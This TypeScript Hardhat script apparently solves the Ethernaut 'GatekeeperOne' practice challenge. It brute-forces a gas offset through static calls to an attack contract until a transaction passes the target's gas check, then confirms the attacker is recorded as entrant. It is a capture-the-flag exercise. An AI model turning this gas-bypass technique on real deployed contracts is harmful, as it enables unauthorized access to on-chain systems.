import { deployments, ethers } from "hardhat";
import { BigNumber } from "ethers";
import { Deployment } from "hardhat-deploy/types";
import { AttackGateKeeperOne, GatekeeperOne } from "../typechain-types";

const GAS: BigNumber = BigNumber.from("81910");
const OFFSET_GAS: BigNumber = BigNumber.from("450");

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const checkMissionStatus = async (gateKeeperOne: GatekeeperOne, deployerAddress: string) => {
  const isMissionAccomplished = await gateKeeperOne.entrant() === deployerAddress;
  console.log(`🎯 Mission Accomplished: ${isMissionAccomplished ? '✅ Yes!' : '❌ No!'}`);
}

const main = async (): Promise<void> => {
  const [deployer] = await ethers.getSigners();
  const gateKeeperOneAddress = "0x76eAd5A3D1979768050574B6921bFDE8003bE30d";
  const gateKeeperOne: GatekeeperOne = await ethers.getContractAt("GatekeeperOne", gateKeeperOneAddress);
  const attackGateKeeperOneDeployment: Deployment = await deployments.get("AttackGateKeeperOne");
  const attackGateKeeperOne: AttackGateKeeperOne = await ethers.getContractAt("AttackGateKeeperOne", attackGateKeeperOneDeployment.address);

  await checkMissionStatus(gateKeeperOne, await deployer.getAddress());

  ethers.utils.Logger.setLogLevel(ethers.utils.Logger.levels.OFF);

  for(let i = BigNumber.from("0"); i.lte(OFFSET_GAS); i = i.add(BigNumber.from("1"))) {
    process.stdout.write(`🛢️ Testing with offset gas: ${i.toString()}... `);
    
    try {
      await attackGateKeeperOne.callStatic.attack(GAS, i);
      process.stdout.write(`⛽ Using offset gas: ${i}\n`);
      let tx = await attackGateKeeperOne.attack(GAS, i,{ gasLimit: 250000});
      if ((await tx.wait()).status === 1) {
        console.log(`🚀 Attack GatekeeperOne operation successful`);
        break;
      }
    } catch (error) {
      process.stdout.write(`⛔ Gas Error with: ${i}\r`);
    }
  }

  await delay(5000);
  await checkMissionStatus(gateKeeperOne, await deployer.getAddress());
};

main().catch(error => {
  console.error('🚫', error);
});
